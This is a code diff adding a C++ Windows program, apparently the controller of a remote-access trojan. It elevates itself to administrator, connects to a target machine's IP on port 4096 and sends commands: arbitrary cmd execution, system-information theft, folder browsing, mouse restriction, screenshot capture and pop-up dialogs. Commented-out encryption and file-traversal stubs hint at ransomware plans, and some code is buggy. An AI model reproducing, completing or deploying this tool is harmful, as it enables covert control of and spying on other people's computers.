@@ -1,0 +1,289 @@
+#define _AFXDLL
+#include <iostream>
+#include <sstream>
+#include <afxext.h>
+#include <winsock2.h>
+#include <windows.h>
+#include <fstream>
+#include <winsock2.h>
+#pragma comment(lib, "ws2_32.lib")
+
+using namespace std;
+
+//void encryption(char* fileName);
+//void traverFile(char* pathName);
+//获取管理员权限
+void GainAdminPrivileges(CString strApp) {
+	SHELLEXECUTEINFO execinfo;
+	memset(&execinfo, 0, sizeof(execinfo));
+	execinfo.lpFile = strApp;
+	execinfo.cbSize = sizeof(execinfo);
+	execinfo.lpVerb = _T("runas");
+	execinfo.fMask = SEE_MASK_NO_CONSOLE;
+	execinfo.nShow = SW_SHOWDEFAULT;
+
+	ShellExecuteEx(&execinfo);
+}
+
+BOOL ExeIsAdmin() {
+#define ACCESS_READ 1
+#define ACCESS_WRITE 2
+	HANDLE hToken;
+	DWORD dwStatus;
+	DWORD dwAccessMask;
+	DWORD dwAccessDesired;
+	DWORD dwACLSize;
+	DWORD dwStructureSize = sizeof(PRIVILEGE_SET);
+	PACL pACL = NULL;
+	PSID psidAdmin = NULL;
+	BOOL bReturn = FALSE;
+	PRIVILEGE_SET ps;
+	GENERIC_MAPPING GenericMapping;
+	PSECURITY_DESCRIPTOR psdAdmin = NULL;
+	SID_IDENTIFIER_AUTHORITY SystemSidAuthority = SECURITY_NT_AUTHORITY;
+
+	if (!ImpersonateSelf(SecurityImpersonation))
+		goto LeaveIsAdmin;
+
+	if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken)) {
+		if (GetLastError() != ERROR_NO_TOKEN)
+			goto LeaveIsAdmin;
+
+		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
+			goto LeaveIsAdmin;
+
+		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
+			goto LeaveIsAdmin;
+	}
+
+	if (!AllocateAndInitializeSid(&SystemSidAuthority, 2,
+		SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
+		0, 0, 0, 0, 0, 0, &psidAdmin))
+		goto LeaveIsAdmin;
+
+	psdAdmin = LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
+	if (psdAdmin == NULL)
+		goto LeaveIsAdmin;
+
+	if (!InitializeSecurityDescriptor(psdAdmin,
+		SECURITY_DESCRIPTOR_REVISION))
+		goto LeaveIsAdmin;
+
+	dwACLSize = sizeof(ACL) + sizeof(ACCESS_ALLOWED_ACE) +
+		GetLengthSid(psidAdmin) - sizeof(DWORD);
+
+	pACL = (PACL)LocalAlloc(LPTR, dwACLSize);
+	if (pACL == NULL)
+		goto LeaveIsAdmin;
+
+	if (!InitializeAcl(pACL, dwACLSize, ACL_REVISION2))
+		goto LeaveIsAdmin;
+
+	dwAccessMask = ACCESS_READ | ACCESS_WRITE;
+
+	if (!AddAccessAllowedAce(pACL, ACL_REVISION2, dwAccessMask, psidAdmin))
+		goto LeaveIsAdmin;
+
+	if (!SetSecurityDescriptorDacl(psdAdmin, TRUE, pACL, FALSE))
+		goto LeaveIsAdmin;
+
+	if (!SetSecurityDescriptorGroup(psdAdmin, psidAdmin, FALSE))
+		goto LeaveIsAdmin;
+	if (!SetSecurityDescriptorOwner(psdAdmin, psidAdmin, FALSE))
+		goto LeaveIsAdmin;
+
+	if (!IsValidSecurityDescriptor(psdAdmin))
+		goto LeaveIsAdmin;
+
+	dwAccessDesired = ACCESS_READ;
+
+	GenericMapping.GenericRead = ACCESS_READ;
+	GenericMapping.GenericWrite = ACCESS_WRITE;
+	GenericMapping.GenericExecute = 0;
+	GenericMapping.GenericAll = ACCESS_READ | ACCESS_WRITE;
+
+	if (!AccessCheck(psdAdmin, hToken, dwAccessDesired,
+		&GenericMapping, &ps, &dwStructureSize, &dwStatus, &bReturn))
+		goto LeaveIsAdmin;
+
+	if (!RevertToSelf())
+		bReturn = FALSE;
+LeaveIsAdmin:
+	if (pACL) LocalFree(pACL);
+	if (psdAdmin) LocalFree(psdAdmin);
+	if (psidAdmin) FreeSid(psidAdmin);
+
+	return bReturn;
+}
+
+int main() {
+	int nRet;
+	char ExePath_c[MAX_PATH] = {};
+	GetModuleFileName(NULL, ExePath_c, MAX_PATH);
+	string ExePath_str = ExePath_c;
+
+	string::size_type pos = 0;
+	while ((pos = ExePath_str.find('\\', pos)) != string::npos) {
+		ExePath_str.insert(pos, "\\");
+		pos = pos + 2;
+	}
+
+	char ExePath[MAX_PATH] = {};
+	for (int i = 0; i < ExePath_str.size(); i++)
+		ExePath[i] = ExePath_str[i];
+
+	CString ExePath_cstr = ExePath;
+	if (!ExeIsAdmin()) {
+		GainAdminPrivileges(ExePath_cstr);
+		return 0;
+	}
+	//颜色属性由两个十六进制数字指定 -- 第一个为背景，第二个则为前景。每个数字可以为以下任何值之一: 0 = 黑色 8 = 灰色 1 = 蓝色 9 = 淡蓝色 2 = 绿色 A = 淡绿色 3 = 湖蓝色 B = 淡浅绿色 4 = 红色 C = 淡红色 5 = 紫色 D = 淡紫色 6 = 黄色 E = 淡黄色 7 = 白色 F = 亮白色 
+	//system("color 02");比如这个就是黑底绿字
+	system("color 59");
+	char ip[1024] = {};
+	cout << "************************************************************************************************************************" << endl;
+	cout << "                                                请输入你想要控制的电脑的IP:" << endl;
+	cin >> ip;
+
+	WSADATA wsdata;
+	nRet = WSAStartup(MAKEWORD(2, 2), &wsdata);
+	if (nRet != 0) {
+		cout << "WSAStartup() 失败！ " << nRet << endl;
+		return -1;
+	}
+
+	SOCKET hSock = socket(PF_INET, SOCK_STREAM, 0);
+
+	SOCKADDR_IN servAddr;
+	servAddr.sin_family = AF_INET;
+	servAddr.sin_addr.s_addr = inet_addr(ip);
+	servAddr.sin_port = htons(4096);
+
+	nRet = connect(hSock, (SOCKADDR*)&servAddr, sizeof(servAddr));
+	if (nRet == SOCKET_ERROR) {
+		cout << "连接失败！ " << WSAGetLastError() << endl;
+		closesocket(hSock);
+		WSACleanup();
+		return -1;
+	}
+	int x;
+	string s;
+	while (true) {
+		char IP[1024] = {};
+		char Check[1024] = {};
+		recv(hSock, IP, 1024, 0);
+		system("cls");
+		while (recv(hSock, Check, 1024, 0) != -1) {
+			cout << "************************************************************************************************************************" << endl;
+			cout << "*****************************************************远程控制系统*******************************************************" << endl;
+			cout << "************************************************************************************************************************" << endl;
+			cout << "                                                目标已连接，IP为:" << IP << endl;
+			cout << "                                                请选择你要执行的功能：\n";
+			cout << "                                                1. cmd命令" << endl;
+			cout << "                                                2. 获取系统版本信息" << endl;
+			cout << "                                                3. 遍历文件夹" << endl;
+			cout << "                                                4. 音乐播放" << endl;
+			cout << "                                                5. 限制鼠标" << endl;
+			cout << "                                                6. 获取屏幕截图" << endl;
+			cout << "                                                7. 弹出对话框" << endl;
+			cout << "                                                8. 退出控制" << endl << endl;
+			cout << "************************************************************************************************************************" << endl;
+			cout << "********************************************************END*************************************************************" << endl;
+			cout << "************************************************************************************************************************" << endl;
+
+			cin >> x;
+			if (x < 1 || x > 8) continue;
+			s = "";
+			s[0] = x + '0';
+
+			send(hSock, s.c_str(), 1024, 0);
+			if (x == 1) {
+				cout << "请输入cmd命令：" << endl;
+				getline(cin, s);
+				getline(cin, s);
+				send(hSock, s.c_str(), 1024, 0);
+			}
+			if (x == 2) {
+				char title[] = "客户端版本信息";
+				char buf[1024];
+				std::ofstream out("systeminfo.txt", std::ios::binary);
+				//while (true)
+				//{
+				int len = recv(hSock, buf, sizeof(buf), 0);
+				//if (len <= 0)
+					//break;
+				out.write(buf, len);
+				MessageBox(NULL, buf, title, NULL);
+				//}
+				out.close();
+				memset(title, 0, sizeof(title));
+				memset(buf, 0, sizeof(buf));
+
+			}
+			
+			/*if (x == 5) {
+				cout << "请输入对话框标题X：" << endl;
+				getline(cin, s);
+				getline(cin, s);
+				send(hSock, s.c_str(), 1024, 0);
+				cout << "请输入对话框内容Y：" << endl;
+				getline(cin, s);
+				send(hSock, s.c_str(), 1024, 0);
+			}*/
+
+		
+			if (x == 6)
+			{
+				char buffer[4096];
+				int fileSize;
+				int nRecv;
+
+				// 先接收文件大小
+				nRecv = recv(hSock, (char*)&fileSize, sizeof(fileSize), 0);
+				if (nRecv != sizeof(fileSize)) {
+					cout << "recv() failed: " << WSAGetLastError() << endl;
+					closesocket(hSock);
+					WSACleanup();
+					return -1;
+				}
+
+				// 接收文件数据
+				ofstream out("screenshot.bmp", ios::binary);
+				int remainSize = fileSize;
+				while (remainSize > 0) {
+					nRecv = recv(hSock, buffer, min(remainSize, sizeof(buffer)), 0);
+					if (nRecv <= 0) {
+						break;
+					}
+					out.write(buffer, nRecv);
+					remainSize -= nRecv;
+				}
+				out.close();
+
+			}
+			if (x == 7) {
+				cout << "请输入对话框标题：" << endl;
+				getline(cin, s);
+				getline(cin, s);
+				send(hSock, s.c_str(), 1024, 0);
+				cout << "请输入对话框内容：" << endl;
+				getline(cin, s);
+				send(hSock, s.c_str(), 1024, 0);
+			}
+			else if (x == 8) {
+				send(hSock, s.c_str(), 1024, 0);
+				break;
+			}
+
+			system("cls");
+		}
+
+		closesocket(hSock);
+		WSACleanup();
+		cout << "对方已下线！" << endl;
+		Sleep(3000);
+		system("cls");
+	}
+
+	return 0;
+}
